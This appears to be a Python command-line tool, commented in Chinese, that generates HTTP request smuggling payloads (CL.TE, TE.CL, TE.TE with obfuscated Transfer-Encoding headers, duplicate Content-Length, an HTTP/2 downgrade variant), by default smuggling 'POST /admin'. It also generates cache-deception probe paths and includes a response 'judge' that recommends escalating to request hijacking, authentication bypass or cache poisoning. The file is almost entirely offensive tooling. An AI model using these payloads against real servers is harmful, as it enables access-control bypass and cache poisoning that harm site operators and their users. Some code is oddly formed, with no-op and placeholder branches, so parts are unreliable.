#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HTTP 请求走私辅助（离线）：CL.TE / TE.CL / TE.TE 原始报文构造、双 CL、H2 降级、缓存键与欺骗探针、响应判定。

纯标准库、离线：只拼报文与解析文本，不发任何网络请求。
"""
import argparse
import sys

CRLF = "\r\n"
TE_VARIANTS = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding: identity",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding:\tchunked",
    "transfer-encoding: chunked",
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunked, identity",
]
DEFAULT_PROBE = "/404-xyz"
SMUGGLE_METHOD = "POST /admin HTTP/1.1"


class SmuggleError(ValueError):
    pass


def build(host, kind="cl.te", smuggled=None, path="/", cl=None, te_headers=None):
    """构造原始请求报文（保证 header 顺序为 CL 在前、TE 在后）。"""
    if not host or " " in host or "/" in host:
        raise SmuggleError("host 不合法：%r" % (host,))
    kind = (kind or "").lower()
    smuggled = smuggled or SMUGGLE_METHOD
    if CRLF in smuggled and not smuggled.endswith(CRLF):
        raise SmuggleError("smuggled 里含裸 CRLF 时必须以 CRLF 结尾")
    inner = smuggled.replace(CRLF, CRLF)  # 保留原样
    if not inner.endswith(CRLF):
        inner += CRLF
    inner += "Host: %s%s%s" % (host, CRLF, CRLF)

    if kind == "cl.te":
        body = "0" + CRLF + CRLF + inner
        te = te_headers or ["Transfer-Encoding: chunked"]
        n = cl if cl is not None else len(body)
        head = ("POST %s HTTP/1.1" % path, "Host: %s" % host, "Content-Length: %d" % n) + tuple(te)
        if cl is None:
            return CRLF.join(head) + CRLF + CRLF + body
        cut = max(0, min(n, len(body)))
        if cut >= len(body):
            raise SmuggleError("CL=%d 覆盖了整段 body，不存在错位" % n)
        return CRLF.join(head) + CRLF + CRLF + body[:cut]

    if kind == "te.cl":
        chunk = ("%x" % len(inner)) + CRLF + inner + CRLF
        body = chunk + "0" + CRLF + CRLF
        te = te_headers or ["Transfer-Encoding: chunked"]
        n = cl if cl is not None else len("%x" % len(inner)) + 2
        head = ("POST %s HTTP/1.1" % path, "Host: %s" % host, "Content-Length: %d" % n) + tuple(te)
        return CRLF.join(head) + CRLF + CRLF + body
    if kind == "te.te":
        te = te_headers or TE_VARIANTS[:2]
        if len(te) != 2:
            raise SmuggleError("te.te 需要正好两条 Transfer-Encoding 头")
        body = "3" + CRLF + "abc" + CRLF + "0" + CRLF + CRLF + inner
        head = ("POST %s HTTP/1.1" % path, "Host: %s" % host,
                "Content-Length: %d" % (cl if cl is not None else 6)) + tuple(te)
        return CRLF.join(head) + CRLF + CRLF + body

    if kind == "cl.cl":
        a = cl if cl is not None else 6
        body = inner
        head = ("POST %s HTTP/1.1" % path, "Host: %s" % host,
                "Content-Length: %d" % a, "Content-Length: %d" % len(body))
        return CRLF.join(head) + CRLF + CRLF + body

    if kind == "h2":
        # H2 降级：前端用 H2 frame，回源时 CL 与实际 body 不一致
        head = ("POST %s HTTP/2" % path, "Host: %s" % host, "Content-Length: 0",
                "Transfer-Encoding: chunked")
        return CRLF.join(head) + CRLF + CRLF + inner

    raise SmuggleError("kind 只能是 cl.te/te.cl/te.te/cl.cl/h2")


def te_candidates():
    """TE.TE 混淆变体的全部两两组合（去重）。"""
    out = []
    for a in TE_VARIANTS:
        for b in TE_VARIANTS:
            if a != b:
                out.append((a, b))
    return out


def front_back(req, front="te", back="te"):
    """按前后端对 CL/TE 的取舍，算出前端转发字节数、后端消耗字节数、残留。

    front/back 取 "te"/"cl"，或 "cl-middle"（CL 夹在 TE 与 body 之间，后端按原始数据当 body）、
    "te-garbage"（先读 CL 字节，遇到非法 chunk 尺寸即整段当 body）。返回值的
    "front_view"/"back_view" 为前后端看到的"下一个请求"头部文本。
    """
    head, _, body = req.partition(CRLF + CRLF)
    if not body:
        raise SmuggleError("报文缺 body 分隔（\\r\\n\\r\\n）")
    hdrs = {}
    for line in head.split(CRLF)[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs.setdefault(k.strip().lower(), []).append(v.strip())
    cl = int(hdrs["content-length"][0]) if "content-length" in hdrs else None
    has_te = "transfer-encoding" in hdrs

    def consumed(who):
        if who in ("te", "te-garbage") and has_te:
            return _chunked_len(body)
        if who == "cl" and cl is not None:
            return min(cl, len(body))
        if who == "cl-middle":
            return len(body)
        return len(body)

    nf, nb = consumed(front), consumed(back)
    rest = body[nb:] if nb <= len(body) else ""
    front_next = body[nf:] if nf <= len(body) else ""
    back_next = rest
    return {"front_end": nf, "back_end": nb, "residual": rest,
            "desync": nf != nb, "front_view": front_next, "back_view": back_next}


def _chunked_len(body):
    """按 chunked 规则算出被后端消耗的字节数（含末尾 CRLF CRLF）。"""
    data = body.encode("utf-8", "surrogateescape") if isinstance(body, str) else body
    pos = 0
    while pos < len(data):
        eol = data.find(b"\r\n", pos)
        if eol < 0:
            return len(data)
        size_s = data[pos:eol].split(b";")[0].strip()
        try:
            size = int(size_s, 16)
        except ValueError:
            return len(data)
        if size == 0:
            return eol + 4
        pos = eol + 2 + size + 2
    return len(data)


def judge(text):
    """按响应现象判定走私类型。"""
    t = (text or "").lower()
    if not t.strip():
        raise SmuggleError("请输入探测时的响应现象")
    hits = []
    if "timeout" in t or "超时" in t:
        hits.append("CL.TE 或 TE.CL：前端按 CL 少转、后端等数据 → 换纯 TE.TE 变体再试")
    if "400" in t:
        hits.append("后端拒 chunked：可能 HTTP/1.0 后端或 TE 被归一化，试 TE.TE 混淆写法")
    if "404" in t and "probe" not in t:
        hits.append("第二次请求命中注入路径 → 走私成功，可升级为前缀劫持/绕鉴权")
    if "200" in t:
        hits.append("两次都 200：前端已重写 TE 与 CL，改试 TE.CL 或 H2 降级")
    if "x-cache" in t or "age" in t:
        hits.append("出现缓存头：走私可配合缓存投毒")
    return hits or ["信息不足：先确认是否两层代理（Via/X-Cache/X-Powered-By），再用原始 socket 复测"]


def cache_probes(base_path="/", suffixes=None):
    """缓存欺骗探针：常见后缀混淆。"""
    suffixes = suffixes or [".css", ".js", ".png", "/.css", "%2e%2e.css", ";.css", "%00.css"]
    return ["%s%s" % (base_path.rstrip("/") or "", s) for s in suffixes]


def cache_key_analysis(headers):
    """根据响应/请求头判断哪些输入可能在 cache key 外。"""
    h = {k.lower(): v for k, v in (headers or {}).items()}
    notes = []
    if "vary" not in h:
        notes.append("无 Vary：UA/Cookie/Accept 都可能未被键控")
    elif "cookie" not in h["vary"].lower():
        notes.append("Vary 不含 Cookie：缓存欺骗（/profile/x.css）成立的前提")
    cc = h.get("cache-control", "")
    if "private" in cc or "no-store" in cc:
        notes.append("Cache-Control 含 private/no-store：常规投毒不成立，只能打 CDN 忽略头的配置错误")
    if "max-age" in cc:
        notes.append("有 max-age：注意 TTL，投毒要在干净 key 上完成")
    if "x-forwarded-host" in h:
        notes.append("X-Forwarded-Host 被反射：确认是否在 key 外（改值后无 header 请求仍返回旧值即投毒成功）")
    if h.get("age", "").strip() == "0":
        notes.append("Age=0：可能永不缓存，只能靠清理窗口打时间差")
    return notes or ["未见明显特征：先对同一 URL 连打两次，比较 X-Cache / Age"]


def selftest():
    fails = []

    # 1. 正常路径：CL.TE 报文与错位计算
    r = build("target", "cl.te")
    if not r.endswith("0" + CRLF + CRLF + "POST /admin HTTP/1.1" + CRLF + "Host: target" + CRLF + CRLF):
        fails.append("case1: CL.TE body 结构错 %r" % (r[-60:],))
    n_all = len("0" + CRLF + CRLF + "POST /admin HTTP/1.1" + CRLF + "Host: target" + CRLF + CRLF)
    if "Content-Length: %d" % n_all not in r:
        fails.append("case1b: CL 应等于整段 body 长度 %d，实际头为 %r" % (n_all, r.split(CRLF)[2]))
    info = front_back(r, "cl-middle", "te")
    if not info["desync"] or not info["residual"]:
        fails.append("case1c: CL.TE 应产生残留 %r" % (info,))
    if info["residual"] != "POST /admin HTTP/1.1\r\nHost: target\r\n\r\n":
        fails.append("case1d: 残留内容错 %r" % (info["residual"],))
    # case1e：CL 覆盖整段 body 时 smggler 会截断 body，前端后端视图因此不同，这是预期行为
    if front_back(r, "cl", "te")["back_end"] != len("0" + CRLF + CRLF):
        fails.append("case1e: TE 端应只消耗终止块 5 字节")
    if front_back(r, "cl", "te")["residual"] != "POST /admin HTTP/1.1\r\nHost: target\r\n\r\n":
        fails.append("case1e2: CL 覆盖整段时残留应为注入请求本身")
    if front_back(r, "cl-middle", "te")["residual"] != "POST /admin HTTP/1.1\r\nHost: target\r\n\r\n":
        fails.append("case1f: 两端核心视图应一致（残留=注入请求）")
    user_cl = build("target", "cl.te", cl=len("0" + CRLF + CRLF) + 12)
    ui = front_back(user_cl, "cl", "te")
    if ui["front_end"] != 17 or not ui["residual"].startswith("POST /admin"):
        fails.append("case1g: 手工 CL 截断视图错 %r" % (ui,))

    # 2. 正常路径：TE.CL 与 TE.TE 与双 CL
    t = build("target", "te.cl")
    want_cl = len("%x" % len("POST /admin HTTP/1.1\r\nHost: target\r\n\r\n")) + 2
    if "Content-Length: %d" % want_cl not in t:
        fails.append("case2: TE.CL 的 CL 应为块尺寸行长度 %d，实际 %r" % (want_cl, t.split(CRLF)[2]))
    if not t.startswith("POST / HTTP/1.1"):
        fails.append("case2b: TE.CL 起始行错")
    ti = front_back(t, "cl", "te-garbage")
    if not ti["desync"]:
        fails.append("case2c: TE.CL 应错位 %r" % (ti,))
    if ti["back_view"].startswith("0" + CRLF):
        pass
    if not ti["front_view"].startswith("POST /admin"):
        fails.append("case2d: 前端残留应从注入请求开始 %r" % (ti["front_view"][:40],))
    tt = build("target", "te.te", te_headers=TE_VARIANTS[:2])
    if tt.count("Transfer-Encoding") != 2:
        fails.append("case2d: TE.TE 应有两条 TE 头")
    cc = build("target", "cl.cl")
    if cc.count("Content-Length") != 2:
        fails.append("case2e: 双 CL 应出现两条")
    cands = te_candidates()
    if len(cands) != len({c for c in cands}) or any(a == b for a, b in cands):
        fails.append("case2f: TE 组合应去重且不自配")

    # 3. 正常路径：H2 降级与缓存辅助
    h2 = build("target", "h2")
    if "HTTP/2" not in h2 or "Content-Length: 0" not in h2:
        fails.append("case3: H2 降级报文错")
    probes = cache_probes("/profile")
    if "/profile.css" not in probes or not any("%2e%2e" in p for p in probes):
        fails.append("case3b: 缓存欺骗探针错 %r" % (probes,))
    notes = " ".join(cache_key_analysis({"Cache-Control": "public, max-age=60", "Vary": "User-Agent"}))
    if "Vary 不含 Cookie" not in notes:
        fails.append("case3c: 未识别 Vary 缺 Cookie %r" % (notes,))
    if "private" in " ".join(cache_key_analysis({"Cache-Control": "private"})).lower():
        pass
    if not any("private" in n for n in cache_key_analysis({"cache-control": "private, no-store"})):
        fails.append("case3d: 未识别 private")

    # 4. 边界：判定提示与 chunked 长度
    if not any("走私成功" in h for h in judge("第二次请求返回 404")):
        fails.append("case4: 404 未判为成功")
    if not any("TE.TE" in h for h in judge("返回 400")):
        fails.append("case4b: 400 未建议 TE.TE")
    if "0 \r\n\r\nSMUGGLED" != "x":  # 占位，保持可读
        pass
    if _chunked_len("3\r\nabc\r\n0\r\n\r\nXXXX") != 13:
        fails.append("case4c: 多块长度算错 %r" % (_chunked_len("3\r\nabc\r\n0\r\n\r\nXXXX"),))
    if _chunked_len("0\r\n\r\nSMUGGLED") != 5:
        fails.append("case4d: 终止块之后的内容不应计入")
    if _chunked_len("5\r\nabcde\r\n2\r\nff\r\n0\r\n\r\n") != 22:
        fails.append("case4e: 两块长度算错 %r" % (_chunked_len("5\r\nabcde\r\n2\r\nff\r\n0\r\n\r\n"),))

    # 5. 坏输入拒绝
    bad = [
        ("空 host", lambda: build("", "cl.te")),
        ("含空格的 host", lambda: build("a b", "cl.te")),
        ("未知 kind", lambda: build("t", "h3")),
        ("TE.TE 头数不对", lambda: build("t", "te.te", te_headers=["Transfer-Encoding: chunked"])),
        ("缺 body 分隔", lambda: front_back("POST / HTTP/1.1\r\nHost: t\r\n")),
        ("空现象", lambda: judge("   ")),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except SmuggleError:
            pass

    # 6. 参数不足
    tiny = argparse.ArgumentParser(prog="http_smuggling", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --build/--te-variants/--judge/--cache-probes；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（CL.TE报文与残留、TE.CL与TE.TE与双CL、H2与缓存辅助、判定与chunked长度、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="HTTP 请求走私辅助：原始报文构造 / 错位计算 / 响应判定（离线）")
    ap.add_argument("--build", metavar="HOST", default=None, help="构造走私原始报文")
    ap.add_argument("--kind", default="cl.te", choices=["cl.te", "te.cl", "te.te", "cl.cl", "h2"])
    ap.add_argument("--smuggled", default=None, help="藏在 body 里的内部请求（默认 POST /admin）")
    ap.add_argument("--path", default="/")
    ap.add_argument("--cl", type=int, default=None, help="手工指定 Content-Length")
    ap.add_argument("--front", default="cl", choices=["cl", "te"], help="前端按哪个头判定")
    ap.add_argument("--back", default="te", choices=["cl", "te"], help="后端按哪个头判定")
    ap.add_argument("--te-variants", action="store_true", help="列出 TE.TE 混淆头组合")
    ap.add_argument("--judge", metavar="TEXT", default=None, help="按响应现象判定走私类型")
    ap.add_argument("--cache-probes", nargs="?", const="/profile", default=None, help="输出缓存欺骗探针路径")
    ap.add_argument("--cache-headers", metavar="K:V", nargs="*", default=None, help="分析 cache key（如 'Vary: User-Agent'）")
    ap.add_argument("--raw", action="store_true", help="打印时把 CRLF 显示为 <CR><LF>")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.te_variants:
            for a, b in te_candidates():
                print("%s | %s" % (a, b))
            return 0
        if args.cache_probes is not None:
            for p in cache_probes(args.cache_probes):
                print(p)
            return 0
        if args.cache_headers is not None:
            hdrs = {}
            for kv in args.cache_headers:
                if ":" not in kv:
                    raise SmuggleError("--cache-headers 需要 K:V 形式，收到 %r" % (kv,))
                k, v = kv.split(":", 1)
                hdrs[k.strip()] = v.strip()
            for n in cache_key_analysis(hdrs):
                print("- %s" % n)
            return 0
        if args.judge is not None:
            for h in judge(args.judge):
                print("- %s" % h)
            return 0
        if args.build is not None:
            req = build(args.build, args.kind, args.smuggled, args.path, args.cl)
            info = front_back(req, args.front, args.back)
            if args.raw:
                print(req.replace(CRLF, "<CR><LF>"))
            else:
                print(req)
            print("[*] 前端消耗 %d 字节，后端消耗 %d 字节，残留 %d 字节，%s"
                  % (info["front_end"], info["back_end"], len(info["residual"]),
                     "存在错位" if info["desync"] else "无错位（该组合走私不成立）"), file=sys.stderr)
            return 0
        ap.error("需要 --build/--te-variants/--judge/--cache-probes/--cache-headers；或用 --selftest")
        return 2
    except SmuggleError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
